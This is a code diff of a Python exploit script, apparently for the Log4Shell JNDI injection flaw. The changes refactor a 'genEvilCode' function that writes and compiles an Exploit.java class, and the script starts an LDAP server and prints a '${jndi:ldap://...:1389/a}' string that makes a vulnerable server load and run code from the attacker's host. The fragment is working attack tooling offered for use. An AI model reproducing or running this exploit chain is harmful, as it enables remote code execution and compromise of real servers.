@@ -8,7 +8,7 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 init(autoreset=True)
 
-def payload(userip , webport , lport):
+def genEvilCode(userip, lport):
 
   genExploit = """
 import java.io.IOException;
@@ -53,11 +53,15 @@ public class Exploit {
 
   try:
     Path("Exploit.java").write_text(genExploit)
+    subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
   except OSError as e:
     print(Fore.RED + f'[-] Something went wrong {e}')
     raise e
   else:
     print(Fore.GREEN + '[+] Exploit java class created success')
+
+def payload(userip , webport , lport):
+  genEvilCode(userip, lport)
 
   print(Fore.GREEN + '[+] Setting up LDAP server\n')
 
@@ -83,8 +87,6 @@ def checkJavaAvailible():
 def createLdapServer(userip, lport):
   sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
   print(Fore.GREEN +"[+] Send me: "+sendme+"\n")
-
-  subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
 
   url = "http://{}:{}/#Exploit".format(userip, lport)
   subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
